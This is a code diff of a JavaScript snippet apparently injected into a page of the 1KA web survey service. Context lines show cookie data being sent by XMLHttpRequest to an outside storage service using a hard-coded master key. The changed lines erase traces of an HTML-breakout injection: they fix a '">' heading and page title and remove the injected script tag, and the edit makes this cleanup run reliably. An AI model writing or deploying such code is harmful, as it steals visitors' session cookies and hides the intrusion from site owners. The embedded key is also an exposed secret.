@@ -36,19 +36,13 @@
     xhr.setRequestHeader("X-Master-Key", "$2b$10$.OfJZIPTOgiVyiN./gF6w.9G1rZFeqJiHI88C4Q1/BDu9R8AHC1zW");
     xhr.send(JSON.stringify(cookieData));
 
-    // Check for <h1> tags and page title after the DOM is loaded
-    document.addEventListener('DOMContentLoaded', function() {
+    // Function to modify DOM elements
+    function modifyDOMElements() {
         var h1Elements = document.getElementsByTagName('h1');
         for (var i = 0; i < h1Elements.length; i++) {
             if (h1Elements[i].textContent.trim() === '">') {
                 h1Elements[i].textContent = "Raziskava o nečem";
             }
-        }
-
-        // Replace the page title
-        var pageTitle = document.title;
-        if (pageTitle === '"> - 1KA | Spletne ankete') {
-            document.title = `Raziskava o nečem - 1KA | Spletne ankete`;
         }
         
         // Remove the specific script by its src
@@ -56,6 +50,21 @@
         if (specificScript) {
             specificScript.parentNode.removeChild(specificScript);
         }
-    });
+    }
+
+    // Check if the DOM is already loaded
+    if (document.readyState === 'loading') {
+        // The DOM has not yet been loaded, set up an event listener
+        document.addEventListener('DOMContentLoaded', modifyDOMElements);
+    } else {
+        // The DOM has already been loaded, execute the function immediately
+        modifyDOMElements();
+    }
+
+    // Replace the page title directly without waiting
+    var pageTitle = document.title;
+    if (pageTitle === '"> - 1KA | Spletne ankete') {
+        document.title = `Raziskava o nečem - 1KA | Spletne ankete`;
+    }
 
 })();
